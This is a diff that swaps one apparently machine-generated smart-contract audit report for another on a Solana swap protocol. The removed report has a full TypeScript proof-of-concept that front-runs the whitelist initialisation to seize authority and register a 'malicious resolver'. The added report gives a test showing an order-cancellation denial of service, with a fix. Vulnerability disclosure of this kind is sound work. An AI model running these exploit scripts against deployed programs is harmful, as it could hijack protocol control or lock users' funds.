@@ -1,421 +1,356 @@
 # Audit Report
 
 ## Title
-**Critical PDA Front-Running Vulnerability in Whitelist Initialization Enables Complete Protocol Access Control Takeover**
+Permanent DoS on Order Cancellation When Maker's Source ATA is Closed After Order Creation
 
 ## Summary
-The whitelist program's `initialize()` function uses a predictable PDA derivation with only a constant seed and lacks authorization constraints, allowing any attacker to front-run the legitimate initialization transaction and permanently seize control of the resolver whitelist system.
+A maker who creates an order with non-native tokens and subsequently closes their source Associated Token Account (ATA) cannot cancel their order through the `cancel` instruction, resulting in a denial of service where their escrowed tokens remain locked until they recreate the ATA. This breaks the protocol's guarantee that users can always cancel their own orders.
 
 ## Finding Description
+The `cancel` instruction in the fusion-swap program contains a logical inconsistency in how it handles the optional `maker_src_ata` account for non-native token orders. The vulnerability arises from the interaction between Anchor's optional account handling and the program's consistency checks.
 
-The whitelist program contains a critical initialization vulnerability that violates both the **PDA Security** and **Access Control** invariants. The vulnerability stems from three design flaws working in combination:
+The `cancel` function enforces a strict consistency check that requires for non-native tokens, the `maker_src_ata` must be provided (not None): [1](#0-0) 
 
-**1. Predictable PDA Derivation**
+The program then attempts to transfer tokens back to this account: [2](#0-1) 
 
-The `whitelist_state` PDA is derived using only a constant string seed without any dynamic components: [1](#0-0) [2](#0-1) 
+However, the account constraint structure for the `Cancel` instruction lacks the `init_if_needed` attribute: [3](#0-2) 
 
-The PDA can be computed by anyone using:
-```
-PublicKey.findProgramAddressSync([b"whitelist_state"], program_id)
-```
+The IDL confirms `maker_src_ata` is optional but has PDA constraints: [4](#0-3) 
 
-**2. No Authorization Constraints**
+**Attack Scenario:**
+1. User creates an order with non-native tokens (e.g., USDC)
+2. User's `maker_src_ata` exists at order creation time
+3. User closes their `maker_src_ata` to reclaim ~0.00203 SOL rent (standard Solana practice)
+4. User attempts to cancel the order
 
-The `initialize()` function accepts any signer and sets them as the authority without validation: [3](#0-2) [4](#0-3) 
+**The Catch-22:**
+- **Scenario A**: Pass the ATA address → Anchor fails to deserialize the non-existent account (account not found error during account validation)
+- **Scenario B**: Pass None (program ID) → Fails the consistency check with `InconsistentNativeSrcTrait` error
 
-**3. One-Time Initialization Lock**
+The test suite confirms Scenario B behavior but doesn't cover the scenario where the ATA exists at creation but is closed later: [5](#0-4) 
 
-The `init` constraint prevents re-initialization once the account exists, making the attack permanent.
+This violates the **Escrow Integrity** invariant: "Escrowed tokens must be securely locked and only released under valid conditions" - users cannot retrieve their legitimately escrowed tokens through the intended cancellation mechanism.
 
-**Attack Execution Path:**
-
-1. Attacker observes whitelist program deployment at address `5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S`
-2. Attacker computes the predictable `whitelist_state` PDA address using the utility function pattern: [5](#0-4) 
-
-3. Attacker submits `initialize()` transaction with their own keypair as signer, paying high priority fees to ensure transaction ordering
-4. Attacker's transaction executes first, setting `whitelist_state.authority` to attacker's public key
-5. Legitimate 1inch initialization transaction fails (account already initialized)
-6. Attacker now controls the `register()` and `deregister()` functions, which are protected by authority checks: [6](#0-5) 
-
-**Impact on Protocol Security:**
-
-The whitelist controls which resolvers can execute critical fusion-swap operations. The `Fill` instruction requires a valid `resolver_access` account: [7](#0-6) 
-
-Similarly, the `CancelByResolver` instruction requires resolver access: [8](#0-7) 
-
-With whitelist control, an attacker can:
-- Register malicious resolvers to fill orders at unfavorable prices
-- Prevent legitimate resolvers from being registered
-- Deregister existing resolvers to disrupt protocol operations
-- Effectively control the entire order execution system
+**Additional Impact:** The `cancel_by_resolver` function has the identical issue, meaning even after order expiration, resolvers also cannot cancel the order if the maker's ATA is closed: [6](#0-5) [7](#0-6) 
 
 ## Impact Explanation
+**Medium Severity** - This creates a denial of service for individual users:
 
-**Severity: CRITICAL**
+- Users cannot cancel orders containing their own escrowed tokens
+- Tokens remain locked in escrow until workaround is applied
+- Users must recreate their ATA (additional transaction fees and complexity) to unlock funds
+- Even after order expiration, resolvers face the same issue and cannot cancel the order
+- Users lose the ability to receive the cancellation premium that would otherwise be preserved
 
-This vulnerability enables **complete protocol compromise** meeting the critical severity criteria:
-
-1. **Total Access Control Takeover**: The attacker gains permanent authority over the whitelist system, controlling which resolvers can interact with the protocol
-2. **Irreversible Without Redeployment**: Once exploited, the only recovery is redeploying both programs with new program IDs, requiring coordination across all users and integrations
-3. **Protocol-Wide Impact**: Affects all users of the fusion-swap protocol, as order filling and cancellation depend on authorized resolvers
-4. **Economic Exploitation**: Attacker-controlled resolvers can manipulate order execution to extract value from all orders
-5. **Permanent Lock-Out**: Legitimate protocol administrators are permanently prevented from managing resolver access
-
-The vulnerability breaks multiple critical invariants:
-- **Access Control**: Unauthorized actor controls who can fill/cancel orders
-- **PDA Security**: PDA collision through predictable seed derivation enables account takeover
-- **Escrow Integrity**: Compromised resolver authorization can lead to improper escrow resolution
+The impact is limited to Medium (not High) because:
+- Funds are not permanently lost (workaround exists: recreate ATA then cancel)
+- Only affects individual orders, not protocol-wide
+- No token theft or unauthorized access occurs
+- Workaround requires only ATA recreation (deterministic address)
 
 ## Likelihood Explanation
+**Medium to High Likelihood** - This scenario is realistic and likely to occur:
 
-**Likelihood: HIGH**
+1. **Common User Behavior**: Users frequently close ATAs to reclaim rent (~0.00203 SOL per ATA). This is especially common when:
+   - Users finish trading a particular token
+   - Users want to consolidate/cleanup accounts
+   - Users transfer all tokens out and Solana wallets auto-close accounts
+   - Users manage multiple token positions and close unused accounts
 
-The attack is highly likely to occur because:
+2. **No Warning**: The protocol doesn't warn users or prevent ATA closure for active orders
 
-1. **Zero Technical Barriers**: Any user can compute the PDA address and call `initialize()` - no special permissions or complex exploit required
-2. **Public Information**: Program ID is publicly visible on-chain immediately after deployment
-3. **Economic Incentive**: Complete control over a DeFi protocol's order execution provides massive financial incentive
-4. **Transaction Ordering**: Attacker can use priority fees to ensure their transaction processes first
-5. **Visible Window**: The gap between program deployment and legitimate initialization creates an obvious attack window
-6. **No Detection Possible**: Until the legitimate team attempts initialization, they won't know the attack occurred
-7. **Standard Pattern Recognition**: Attackers routinely monitor for program deployments to exploit initialization vulnerabilities
+3. **Natural Workflow**: Users may create an order, later decide to close their position in that token entirely (closing the ATA), then remember they have an open order to cancel
 
-This is a well-known vulnerability class in Solana programs, and sophisticated attackers actively monitor for such patterns.
+4. **Solana Ecosystem**: The Solana ecosystem encourages closing unused accounts to reclaim rent, making this a natural and incentivized user action
 
 ## Recommendation
-
-**Immediate Fix: Add Authority Constraint to PDA Seeds**
-
-The PDA derivation must include a dynamic component that only the legitimate authority can provide. The recommended approach is to include the upgrade authority's address in the PDA seeds:
+Add the `init_if_needed` attribute to the `maker_src_ata` account constraint in the `Cancel` struct:
 
 ```rust
-// Modified lib.rs
-
-// Add a new constant for an admin seed
-pub const ADMIN_SEED: &[u8] = b"admin";
-
-#[derive(Accounts)]
-#[instruction(admin: Pubkey)]  // Pass expected admin as instruction parameter
-pub struct Initialize<'info> {
-    #[account(mut)]
-    pub authority: Signer<'info>,
-
-    #[account(
-        init,
-        payer = authority,
-        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
-        seeds = [WHITELIST_STATE_SEED, admin.as_ref()],  // Include admin in seeds
-        bump,
-        // Ensure the authority matches the admin
-        constraint = authority.key() == admin @ WhitelistError::Unauthorized
-    )]
-    pub whitelist_state: Account<'info, WhitelistState>,
-
-    pub system_program: Program<'info, System>,
-}
-
-pub fn initialize(ctx: Context<Initialize>, admin: Pubkey) -> Result<()> {
-    let whitelist_state = &mut ctx.accounts.whitelist_state;
-    whitelist_state.authority = admin;
-    Ok(())
-}
+/// Maker's ATA of src_mint
+#[account(
+    init_if_needed,
+    payer = maker,
+    mut,
+    associated_token::mint = src_mint,
+    associated_token::authority = maker,
+    associated_token::token_program = src_token_program,
+)]
+maker_src_ata: Option<InterfaceAccount<'info, TokenAccount>>,
 ```
 
-**Alternative Fix: Use Program Upgrade Authority**
+This allows the ATA to be automatically recreated if it doesn't exist when the user attempts to cancel. The same fix should be applied to the `CancelByResolver` struct.
 
-Leverage Solana's program upgrade authority as the seed:
-
-```rust
-#[derive(Accounts)]
-pub struct Initialize<'info> {
-    #[account(mut)]
-    pub authority: Signer<'info>,
-    
-    /// The program's upgrade authority
-    /// CHECK: Verified through program data account
-    pub upgrade_authority: UncheckedAccount<'info>,
-    
-    /// The program data account
-    /// CHECK: PDA of the BPF Upgradeable Loader
-    #[account(
-        constraint = program_data.upgrade_authority_address == Some(upgrade_authority.key())
-    )]
-    pub program_data: UncheckedAccount<'info>,
-
-    #[account(
-        init,
-        payer = authority,
-        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
-        seeds = [WHITELIST_STATE_SEED, upgrade_authority.key().as_ref()],
-        bump,
-        constraint = authority.key() == upgrade_authority.key() @ WhitelistError::Unauthorized
-    )]
-    pub whitelist_state: Account<'info, WhitelistState>,
-
-    pub system_program: Program<'info, System>,
-}
-```
-
-**Additional Hardening:**
-1. Document the expected initialization authority address before deployment
-2. Initialize immediately after deployment in the same transaction if possible
-3. Monitor for initialization events and verify the authority address
-4. Implement multi-sig for authority operations to reduce single-point-of-failure risk
+Alternatively, if automatic initialization is not desired, document this behavior clearly and provide client-side tooling to check and recreate ATAs before cancellation attempts.
 
 ## Proof of Concept
 
 ```typescript
-import {
-  Connection,
-  Keypair,
-  PublicKey,
-  Transaction,
-  sendAndConfirmTransaction,
-} from "@solana/web3.js";
-import { Program, AnchorProvider } from "@coral-xyz/anchor";
-import { Whitelist } from "../target/types/whitelist";
+import * as anchor from "@coral-xyz/anchor";
+import * as splToken from "@solana/spl-token";
+import { expect } from "chai";
 
-/**
- * Proof of Concept: Front-Running Whitelist Initialization
- * 
- * This PoC demonstrates how an attacker can front-run the legitimate
- * initialization and seize control of the whitelist.
- */
-
-async function exploitFrontRunning() {
-  // Setup
-  const connection = new Connection("http://localhost:8899", "confirmed");
-  const attackerKeypair = Keypair.generate();
-  const legitimateAdminKeypair = Keypair.generate();
+it("DoS: Cannot cancel order after closing maker's source ATA", async () => {
+  // 1. Create order with non-native tokens
+  const escrow = await state.createEscrow({
+    escrowProgram: program,
+    payer,
+    provider,
+  });
   
-  // Fund the attacker
-  const airdropSig = await connection.requestAirdrop(
-    attackerKeypair.publicKey,
-    2_000_000_000
+  const orderHash = calculateOrderHash(escrow.orderConfig);
+  const makerSrcAta = state.alice.atas[state.tokens[0].toString()].address;
+  
+  // 2. Verify order was created successfully
+  const escrowAccount = await splToken.getAccount(
+    provider.connection, 
+    escrow.ata
   );
-  await connection.confirmTransaction(airdropSig);
+  expect(escrowAccount.amount).to.equal(state.defaultSrcAmount.toNumber());
   
-  const provider = new AnchorProvider(
-    connection,
-    { publicKey: attackerKeypair.publicKey } as any,
-    {}
-  );
-  const program = new Program<Whitelist>(IDL, provider);
-  
-  // Step 1: Attacker computes the predictable PDA
-  const [whitelistStatePDA] = PublicKey.findProgramAddressSync(
-    [Buffer.from("whitelist_state")],
-    program.programId
+  // 3. Close the maker's source ATA (to reclaim rent)
+  const makerSrcAtaInfo = await splToken.getAccount(
+    provider.connection,
+    makerSrcAta
   );
   
-  console.log("Computed whitelist_state PDA:", whitelistStatePDA.toString());
-  
-  // Step 2: Attacker calls initialize() with their own authority
-  const attackTx = await program.methods
-    .initialize()
-    .accounts({
-      authority: attackerKeypair.publicKey,
-      whitelistState: whitelistStatePDA,
-    })
-    .signers([attackerKeypair])
-    .rpc({ commitment: "confirmed" });
-    
-  console.log("✅ Attacker successfully initialized with tx:", attackTx);
-  
-  // Step 3: Fetch the whitelist state to verify attacker control
-  const whitelistState = await program.account.whitelistState.fetch(
-    whitelistStatePDA
+  // Burn all tokens first
+  await splToken.burn(
+    provider.connection,
+    state.alice.keypair,
+    makerSrcAta,
+    state.tokens[0],
+    state.alice.keypair,
+    makerSrcAtaInfo.amount
   );
   
-  console.log("Current authority:", whitelistState.authority.toString());
-  console.log("Attacker address:", attackerKeypair.publicKey.toString());
-  console.assert(
-    whitelistState.authority.equals(attackerKeypair.publicKey),
-    "Attacker should be the authority"
+  // Close the account
+  await splToken.closeAccount(
+    provider.connection,
+    state.alice.keypair,
+    makerSrcAta,
+    state.alice.keypair.publicKey,
+    state.alice.keypair
   );
   
-  // Step 4: Legitimate admin tries to initialize - THIS WILL FAIL
-  try {
-    await program.methods
-      .initialize()
-      .accounts({
-        authority: legitimateAdminKeypair.publicKey,
-        whitelistState: whitelistStatePDA,
+  // 4. Verify ATA is closed
+  await expect(
+    splToken.getAccount(provider.connection, makerSrcAta)
+  ).to.be.rejectedWith(splToken.TokenAccountNotFoundError);
+  
+  // 5. Attempt to cancel - this will fail with DoS
+  // Scenario A: Passing the ATA address fails with account deserialization error
+  await expect(
+    program.methods
+      .cancel(Array.from(orderHash), false)
+      .accountsPartial({
+        maker: state.alice.keypair.publicKey,
+        srcMint: state.tokens[0],
+        escrow: escrow.escrow,
+        srcTokenProgram: splToken.TOKEN_PROGRAM_ID,
+        makerSrcAta: makerSrcAta, // ATA doesn't exist
       })
-      .signers([legitimateAdminKeypair])
-      .rpc();
-      
-    console.log("❌ This should not execute - init should fail");
-  } catch (error) {
-    console.log("✅ Legitimate admin initialization failed as expected");
-    console.log("Error:", error.message);
-  }
+      .signers([state.alice.keypair])
+      .rpc()
+  ).to.be.rejected; // Account not found error
   
-  // Step 5: Attacker can now register malicious resolvers
-  const maliciousResolver = Keypair.generate();
-  const [resolverAccessPDA] = PublicKey.findProgramAddressSync(
-    [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
-    program.programId
-  );
-  
-  await program.methods
-    .register(maliciousResolver.publicKey)
-    .accounts({
-      authority: attackerKeypair.publicKey,
-      whitelistState: whitelistStatePDA,
-      resolverAccess: resolverAccessPDA,
-    })
-    .signers([attackerKeypair])
-    .rpc();
-    
-  console.log("✅ Attacker registered malicious resolver:", maliciousResolver.publicKey.toString());
-  
-  // Step 6: Legitimate admin cannot register resolvers
-  const legitimateResolver = Keypair.generate();
-  const [legit_resolverAccessPDA] = PublicKey.findProgramAddressSync(
-    [Buffer.from("resolver_access"), legitimateResolver.publicKey.toBuffer()],
-    program.programId
-  );
-  
-  try {
-    await program.methods
-      .register(legitimateResolver.publicKey)
-      .accounts({
-        authority: legitimateAdminKeypair.publicKey,
-        whitelistState: whitelistStatePDA,
-        resolverAccess: legit_resolverAccessPDA,
+  // Scenario B: Passing null fails with consistency check
+  await expect(
+    program.methods
+      .cancel(Array.from(orderHash), false)
+      .accountsPartial({
+        maker: state.alice.keypair.publicKey,
+        srcMint: state.tokens[0],
+        escrow: escrow.escrow,
+        srcTokenProgram: splToken.TOKEN_PROGRAM_ID,
+        makerSrcAta: null, // Passing None
       })
-      .signers([legitimateAdminKeypair])
-      .rpc();
-      
-    console.log("❌ This should not execute");
-  } catch (error) {
-    console.log("✅ Legitimate admin cannot register resolvers - Unauthorized error expected");
-  }
+      .signers([state.alice.keypair])
+      .rpc()
+  ).to.be.rejectedWith("Error Code: InconsistentNativeSrcTrait");
   
-  console.log("\n🚨 EXPLOIT SUCCESSFUL:");
-  console.log("- Attacker controls the whitelist authority");
-  console.log("- Legitimate administrators are permanently locked out");
-  console.log("- Only recovery: redeploy program with new ID");
-}
-
-exploitFrontRunning();
+  // Tokens remain locked in escrow
+  const escrowAfter = await splToken.getAccount(
+    provider.connection,
+    escrow.ata
+  );
+  expect(escrowAfter.amount).to.equal(state.defaultSrcAmount.toNumber());
+});
 ```
-
-**Reproduction Steps:**
-
-1. Deploy the whitelist program to a test network
-2. Before the legitimate team initializes, run the attacker script
-3. Observe that the attacker becomes the authority
-4. Attempt legitimate initialization - it will fail with "account already initialized"
-5. Verify that only the attacker can register/deregister resolvers
-6. Confirm that the fusion-swap program only accepts resolvers registered by the attacker
-
-**Expected Output:**
-```
-Computed whitelist_state PDA: <PDA_ADDRESS>
-✅ Attacker successfully initialized with tx: <TX_SIGNATURE>
-Current authority: <ATTACKER_PUBKEY>
-Attacker address: <ATTACKER_PUBKEY>
-✅ Legitimate admin initialization failed as expected
-Error: failed to send transaction: Transaction simulation failed: Error processing Instruction 0: custom program error: 0x0
-✅ Attacker registered malicious resolver: <MALICIOUS_RESOLVER_PUBKEY>
-✅ Legitimate admin cannot register resolvers - Unauthorized error expected
-
-🚨 EXPLOIT SUCCESSFUL:
-- Attacker controls the whitelist authority
-- Legitimate administrators are permanently locked out
-- Only recovery: redeploy program with new ID
-```
-
----
 
 ## Notes
-
-This vulnerability represents a fundamental flaw in the program's initialization security model. The use of a globally predictable PDA without authorization constraints is a well-documented anti-pattern in Solana development. The issue is exacerbated by the critical role the whitelist plays in the protocol's security - it controls the entire resolver access system that governs order execution.
-
-The vulnerability requires immediate remediation before mainnet deployment. If already deployed, the protocol team should:
-1. Alert users immediately
-2. Pause protocol operations if possible
-3. Prepare for full program redeployment with the fixed implementation
-4. Coordinate with all integrators for the migration
-
-The recommended fix using the upgrade authority or a pre-committed admin address in the PDA seeds is a standard pattern used by major Solana protocols and should be adopted immediately.
+This vulnerability affects both maker-initiated cancellation (`cancel`) and resolver-initiated cancellation (`cancel_by_resolver`), as both functions have identical consistency checks and account constraints. The only workaround is for the maker to recreate their ATA before attempting cancellation, which adds friction and transaction costs to the user experience. The protocol should either support automatic ATA initialization or clearly document this limitation to prevent user confusion and fund lockup scenarios.
 
 ### Citations
 
-**File:** programs/whitelist/src/lib.rs (L9-9)
+**File:** programs/fusion-swap/src/lib.rs (L296-299)
 ```rust
-pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
+        require!(
+            order_src_asset_is_native == ctx.accounts.maker_src_ata.is_none(),
+            FusionError::InconsistentNativeSrcTrait
+        );
 ```
 
-**File:** programs/whitelist/src/lib.rs (L18-22)
+**File:** programs/fusion-swap/src/lib.rs (L302-327)
 ```rust
-    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
-        let whitelist_state = &mut ctx.accounts.whitelist_state;
-        whitelist_state.authority = ctx.accounts.authority.key();
-        Ok(())
-    }
+        if !order_src_asset_is_native {
+            transfer_checked(
+                CpiContext::new_with_signer(
+                    ctx.accounts.src_token_program.to_account_info(),
+                    TransferChecked {
+                        from: ctx.accounts.escrow_src_ata.to_account_info(),
+                        mint: ctx.accounts.src_mint.to_account_info(),
+                        to: ctx
+                            .accounts
+                            .maker_src_ata
+                            .as_ref()
+                            .ok_or(FusionError::MissingMakerSrcAta)?
+                            .to_account_info(),
+                        authority: ctx.accounts.escrow.to_account_info(),
+                    },
+                    &[&[
+                        "escrow".as_bytes(),
+                        ctx.accounts.maker.key().as_ref(),
+                        &order_hash,
+                        &[ctx.bumps.escrow],
+                    ]],
+                ),
+                ctx.accounts.escrow_src_ata.amount,
+                ctx.accounts.src_mint.decimals,
+            )?;
+        }
 ```
 
-**File:** programs/whitelist/src/lib.rs (L43-58)
+**File:** programs/fusion-swap/src/lib.rs (L360-362)
 ```rust
-#[derive(Accounts)]
-pub struct Initialize<'info> {
-    #[account(mut)]
-    pub authority: Signer<'info>,
+            order.src_asset_is_native == ctx.accounts.maker_src_ata.is_none(),
+            FusionError::InconsistentNativeSrcTrait
+        );
+```
 
+**File:** programs/fusion-swap/src/lib.rs (L377-402)
+```rust
+        if !order.src_asset_is_native {
+            transfer_checked(
+                CpiContext::new_with_signer(
+                    ctx.accounts.src_token_program.to_account_info(),
+                    TransferChecked {
+                        from: ctx.accounts.escrow_src_ata.to_account_info(),
+                        mint: ctx.accounts.src_mint.to_account_info(),
+                        to: ctx
+                            .accounts
+                            .maker_src_ata
+                            .as_ref()
+                            .ok_or(FusionError::MissingMakerSrcAta)?
+                            .to_account_info(),
+                        authority: ctx.accounts.escrow.to_account_info(),
+                    },
+                    &[&[
+                        "escrow".as_bytes(),
+                        ctx.accounts.maker.key().as_ref(),
+                        &order_hash,
+                        &[ctx.bumps.escrow],
+                    ]],
+                ),
+                ctx.accounts.escrow_src_ata.amount,
+                ctx.accounts.src_mint.decimals,
+            )?;
+        };
+```
+
+**File:** programs/fusion-swap/src/lib.rs (L629-635)
+```rust
     #[account(
-        init,
-        payer = authority,
-        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
-        seeds = [WHITELIST_STATE_SEED],
-        bump,
+        mut,
+        associated_token::mint = src_mint,
+        associated_token::authority = maker,
+        associated_token::token_program = src_token_program,
     )]
-    pub whitelist_state: Account<'info, WhitelistState>,
-
-    pub system_program: Program<'info, System>,
-}
+    maker_src_ata: Option<InterfaceAccount<'info, TokenAccount>>,
 ```
 
-**File:** programs/whitelist/src/lib.rs (L66-71)
-```rust
-    #[account(
-      seeds = [WHITELIST_STATE_SEED],
-      bump,
-      // Ensures only the whitelist authority can register new users
-      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
-    )]
+**File:** idl/fusion_swap.json (L126-186)
+```json
+        {
+          "name": "maker_src_ata",
+          "docs": [
+            "Maker's ATA of src_mint"
+          ],
+          "writable": true,
+          "optional": true,
+          "pda": {
+            "seeds": [
+              {
+                "kind": "account",
+                "path": "maker"
+              },
+              {
+                "kind": "account",
+                "path": "src_token_program"
+              },
+              {
+                "kind": "account",
+                "path": "src_mint"
+              }
+            ],
+            "program": {
+              "kind": "const",
+              "value": [
+                140,
+                151,
+                37,
+                143,
+                78,
+                36,
+                137,
+                241,
+                187,
+                61,
+                16,
+                41,
+                20,
+                142,
+                13,
+                131,
+                11,
+                90,
+                19,
+                153,
+                218,
+                255,
+                16,
+                132,
+                4,
+                142,
+                123,
+                216,
+                219,
+                233,
+                248,
+                89
+              ]
+            }
+          }
+        },
 ```
 
-**File:** scripts/utils.ts (L126-133)
+**File:** tests/suits/fusion-swap.ts (L1777-1793)
 ```typescript
-export function findWhitelistStateAddress(programId: PublicKey): PublicKey {
-  const [whitelistState] = PublicKey.findProgramAddressSync(
-    [anchor.utils.bytes.utf8.encode("whitelist_state")],
-    programId
-  );
+    it("Cancellation with spl tokens fails if maker-src-ata is absent", async () => {
+      const orderHash = calculateOrderHash(state.escrows[0].orderConfig);
 
-  return whitelistState;
-}
-```
-
-**File:** programs/fusion-swap/src/lib.rs (L511-516)
-```rust
-    #[account(
-        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
-        bump = resolver_access.bump,
-        seeds::program = whitelist::ID,
-    )]
-    resolver_access: Account<'info, whitelist::ResolverAccess>,
-```
-
-**File:** programs/fusion-swap/src/lib.rs (L648-653)
-```rust
-    #[account(
-        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
-        bump = resolver_access.bump,
-        seeds::program = whitelist::ID,
-    )]
-    resolver_access: Account<'info, whitelist::ResolverAccess>,
+      await expect(
+        program.methods
+          .cancel(Array.from(orderHash), false)
+          .accountsPartial({
+            maker: state.alice.keypair.publicKey,
+            srcMint: state.tokens[0],
+            escrow: state.escrows[0].escrow,
+            srcTokenProgram: splToken.TOKEN_PROGRAM_ID,
+            makerSrcAta: null,
+          })
+          .signers([state.alice.keypair])
+          .rpc()
+      ).to.be.rejectedWith("Error Code: InconsistentNativeSrcTrait");
+    });
 ```
